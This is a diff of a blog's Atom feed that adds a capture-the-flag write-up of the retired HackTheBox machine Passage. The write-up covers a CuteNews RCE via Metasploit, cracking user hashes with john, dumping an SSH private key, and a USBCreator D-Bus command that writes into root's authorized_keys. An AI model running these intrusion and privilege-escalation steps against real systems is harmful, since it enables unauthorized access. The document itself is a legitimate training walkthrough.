@@ -1,5 +1,182 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-02-28T10:00:00+01:00</updated><entry><title>HTB: Academy</title><link href="https://maggick.fr/2021/02/htb-academy.html" rel="alternate"></link><published>2021-02-28T10:00:00+01:00</published><updated>2021-02-28T10:00:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-02-28:/2021/02/htb-academy.html</id><summary type="html">&lt;p&gt;&lt;img alt="Academy card" class="align-left" src="/media/2021.02/academy_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-03-09T09:20:00+01:00</updated><entry><title>HTB: Passage</title><link href="https://maggick.fr/2021/03/htb-passage.html" rel="alternate"></link><published>2021-03-09T09:20:00+01:00</published><updated>2021-03-09T09:20:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-03-09:/2021/03/htb-passage.html</id><summary type="html">&lt;p&gt;&lt;img alt="Passage Card" class="align-left" src="/media/2021.03/passage_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/275"&gt;Passage&lt;/a&gt; publish on
+September 2, 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/140851"&gt;ChefByzen&lt;/a&gt;.
+This box is rated as a medium box. It implies two public exploit and a share SSH
+private key.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.03/passage_card.png" alt="Passage Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/275"&gt;Passage&lt;/a&gt; publish on
+September 2, 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/140851"&gt;ChefByzen&lt;/a&gt;.
+This box is rated as a medium box. It implies two public exploit and a share SSH
+private key.&lt;/p&gt;
+
+
+&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are
+open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Sep  12 03:46:59 2020 as: nmap -p- -sSV -oN nmap 10.10.10.206&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.206&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.086s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;We browse to the website. This is a simple blog with some news. One of them is
+about a &lt;a href="https://www.fail2ban.org/wiki/index.php/Main_Page"&gt;fail2ban&lt;/a&gt;
+implementation. This will dissuade us to brute force login (which rarely happen on HTB) and run &lt;code&gt;dirb&lt;/code&gt; against
+the site.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Passage News index" src="/media/2021.03/passage_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;When looking at the bottom of the page we see that the blog is "Powered by
+CuteNews". A few Google search lead us to the admin panel located at &lt;code&gt;/CuteNews&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Cute News login page" src="/media/2021.03/passage_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;We can login (but we don't have any creds) or we can create an account.
+We also check the available exploit for this CuteNews version (2.1.2).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit CuteNews 2.1.2&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------------------------------------------- ---------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Exploit Title                                             |  Path&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------------------------------------------- ---------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;CuteNews 2.1.2 - &amp;#39;avatar&amp;#39; Remote Code Execution (Metasploi | php/remote/46698.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;CuteNews 2.1.2 - Arbitrary File Deletion                   | php/webapps/48447.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;CuteNews 2.1.2 - Authenticated Arbitrary File Upload       | php/webapps/48458.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------------------------------------------- ---------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Shellcodes: No Results&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We import the 'Avatar' exploit into metasploit using &lt;a href="https://github.com/rapid7/metasploit-framework/wiki/Running-Private-Modules"&gt;rapid7 guide&lt;/a&gt;.
+We register an account an launch the exploit and got a reverse shell as &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We look at the available files. We found the &lt;code&gt;cdata&lt;/code&gt; folder just a level above
+and then the &lt;code&gt;users&lt;/code&gt; directory. We display some of them. They contain base64
+encoded user data. Some of them contain a SHA256 hashed password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat b0.php&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;?php die(&amp;#39;Direct call - access denied&amp;#39;); ?&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTYwMDA4MDM1OSI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;a:1:{s:4:&amp;quot;name&amp;quot;;a:1:{s:10:&amp;quot;paul-coles&amp;quot;;a:9:{s:2:&amp;quot;id&amp;quot;;s:10:&amp;quot;1592483236&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:10:&amp;quot;paul-coles&amp;quot;;s:3:&amp;quot;acl&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:5:&amp;quot;email&amp;quot;;s:16:&amp;quot;paul@passage.htb&amp;quot;;s:4:&amp;quot;nick&amp;quot;;s:10:&amp;quot;Paul Coles&amp;quot;;s:4:&amp;quot;pass&amp;quot;;s:64:&amp;quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&amp;quot;;s:3:&amp;quot;lts&amp;quot;;s:10:&amp;quot;1592485556&amp;quot;;s:3:&amp;quot;ban&amp;quot;;s:1:&amp;quot;0&amp;quot;;s:3:&amp;quot;cnt&amp;quot;;s:1:&amp;quot;2&amp;quot;;}}}&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We grab all the hashes and crack them using &lt;code&gt;john&lt;/code&gt; and the rockyou wordlist.
+&lt;code&gt;Paul&lt;/code&gt;'s password is &lt;code&gt;atlanta1&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;[maggick@fomalhaut ~]$ john hash -w=~/tools/password_lists/rockyou.txt --fork=8 --rules --format=Raw-SHA256&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;Using default input encoding: UTF-8&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c"&gt;Warning: OpenMP was disabled due to --fork; a non-OpenMP build may be faster&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;Node numbers 1-8 of 8 (fork)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;Each node loaded 1/8 of wordfile to memory (about 16 MB/node)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;atlanta1         (paul)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;atlanta1         (paul)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;atlanta1         (paul)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;atlanta1         (paul)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;Waiting for 7 children to terminate&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;Session completed&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We open a shell, and try to switch user but we cannot use &lt;code&gt;su&lt;/code&gt; as we don't have
+a proper terminal. Using
+&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell"&gt;Payload all the things cheatsheet&lt;/a&gt;
+we get an interactive shell and get logged in as &lt;code&gt;paul&lt;/code&gt; and grab the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; shell&lt;/span&gt;
+&lt;span class="code-line"&gt;Process 3053 created.&lt;/span&gt;
+&lt;span class="code-line"&gt;Channel 14 created.&lt;/span&gt;
+&lt;span class="code-line"&gt;  su &lt;/span&gt;
+&lt;span class="code-line"&gt;su: must be run from a terminal&lt;/span&gt;
+&lt;span class="code-line"&gt;/usr/bin/script -qc /bin/bash /dev/null                  &lt;/span&gt;
+&lt;span class="code-line"&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul&lt;/span&gt;
+&lt;span class="code-line"&gt;su paul&lt;/span&gt;
+&lt;span class="code-line"&gt;Password: atlanta1&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;paul@passage:/var/www/html/CuteNews/cdata/users$ cd&lt;/span&gt;
+&lt;span class="code-line"&gt;cd&lt;/span&gt;
+&lt;span class="code-line"&gt;paul@passage:~$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;cat user.txt &lt;/span&gt;
+&lt;span class="code-line"&gt;c9e5ea0c3e42965404e9cf34eaee71bd&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;We grab the SSH key in paul's &lt;code&gt;.ssh&lt;/code&gt; folder. The associated public key show us
+that this is &lt;code&gt;nadav&lt;/code&gt; public (and private) key.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat .ssh/id_rsa.pub&lt;/span&gt;
+&lt;span class="code-line"&gt;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage&lt;/span&gt;
+&lt;span class="code-line"&gt;paul@passage:~$ cat .ssh/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;cat .ssh/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/&lt;/span&gt;
+&lt;span class="code-line"&gt;+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i&lt;/span&gt;
+&lt;span class="code-line"&gt;Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt&lt;/span&gt;
+&lt;span class="code-line"&gt;rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ&lt;/span&gt;
+&lt;span class="code-line"&gt;JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok&lt;/span&gt;
+&lt;span class="code-line"&gt;sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ&lt;/span&gt;
+&lt;span class="code-line"&gt;eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG&lt;/span&gt;
+&lt;span class="code-line"&gt;QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr&lt;/span&gt;
+&lt;span class="code-line"&gt;lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh&lt;/span&gt;
+&lt;span class="code-line"&gt;zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz&lt;/span&gt;
+&lt;span class="code-line"&gt;R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k&lt;/span&gt;
+&lt;span class="code-line"&gt;7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio&lt;/span&gt;
+&lt;span class="code-line"&gt;GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4&lt;/span&gt;
+&lt;span class="code-line"&gt;IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE&lt;/span&gt;
+&lt;span class="code-line"&gt;LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR&lt;/span&gt;
+&lt;span class="code-line"&gt;AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0&lt;/span&gt;
+&lt;span class="code-line"&gt;VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt&lt;/span&gt;
+&lt;span class="code-line"&gt;1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0&lt;/span&gt;
+&lt;span class="code-line"&gt;KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1&lt;/span&gt;
+&lt;span class="code-line"&gt;9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF&lt;/span&gt;
+&lt;span class="code-line"&gt;d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs&lt;/span&gt;
+&lt;span class="code-line"&gt;nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY&lt;/span&gt;
+&lt;span class="code-line"&gt;f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM&lt;/span&gt;
+&lt;span class="code-line"&gt;Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs&lt;/span&gt;
+&lt;span class="code-line"&gt;OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==&lt;/span&gt;
+&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;So we just us the SSH key to connect as &lt;code&gt;nadav&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh -l nadav 10.10.10.206 -i .ssh/id_rsa-2&lt;/span&gt;
+&lt;span class="code-line"&gt;load pubkey &amp;quot;.ssh/id_rsa-2&amp;quot;: invalid format&lt;/span&gt;
+&lt;span class="code-line"&gt;Last login: Mon Sep 14 04:54:44 2020 from 10.10.14.5&lt;/span&gt;
+&lt;span class="code-line"&gt;nadav@passage:~$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We look at the files in the home folder. In .viminfo we found that one of the
+latest edited file is about USBCreator.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Jumplist (newest first):&lt;/span&gt;
+&lt;span class="code-line"&gt;-&amp;#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf&lt;/span&gt;
+&lt;span class="code-line"&gt;-&amp;#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;A quick Google search lead us a &lt;a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/"&gt;blog post&lt;/a&gt; about how to write a file on the system as
+root. We reproduce the step in order to copy &lt;code&gt;nadav&lt;/code&gt;'s &lt;code&gt;authorized_keys&lt;/code&gt; file in
+the &lt;code&gt;root&lt;/code&gt;'s &lt;code&gt;.ssh&lt;/code&gt; directory. We can then connect as &lt;code&gt;root&lt;/code&gt; with our SSH key
+and get the flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true&lt;/span&gt;
+&lt;span class="code-line"&gt;()&lt;/span&gt;
+&lt;span class="code-line"&gt;nadav@passage:~$ logout&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection to 10.10.10.206 closed.&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~$ ssh -l nadav 10.10.10.206 -i .ssh/id_rsa-2&lt;/span&gt;
+&lt;span class="code-line"&gt;load pubkey &amp;quot;.ssh/id_rsa-2&amp;quot;: invalid format&lt;/span&gt;
+&lt;span class="code-line"&gt;Last login: Mon Sep 14 05:13:56 2020 from 127.0.0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;nadav@passage:~$ logout&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection to 10.10.10.206 closed.&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~$ ssh -l root 10.10.10.206 -i .ssh/id_rsa-2&lt;/span&gt;
+&lt;span class="code-line"&gt;load pubkey &amp;quot;.ssh/id_rsa-2&amp;quot;: invalid format&lt;/span&gt;
+&lt;span class="code-line"&gt;Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1&lt;/span&gt;
+&lt;span class="code-line"&gt;root@passage:~# id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
+&lt;span class="code-line"&gt;root@passage:~# cat root.txt o&lt;/span&gt;
+&lt;span class="code-line"&gt;db9c53fcf5bde2fa5a591bcb948a1d3a&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;This box was quit easy. Not to much rabbit hole. At the end this is just the
+chaining of two public exploits. I will recommend it for beginners.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category></entry><entry><title>HTB: Academy</title><link href="https://maggick.fr/2021/02/htb-academy.html" rel="alternate"></link><published>2021-02-28T10:00:00+01:00</published><updated>2021-02-28T10:00:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-02-28:/2021/02/htb-academy.html</id><summary type="html">&lt;p&gt;&lt;img alt="Academy card" class="align-left" src="/media/2021.02/academy_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/297"&gt;Academy&lt;/a&gt; created by
 &lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and
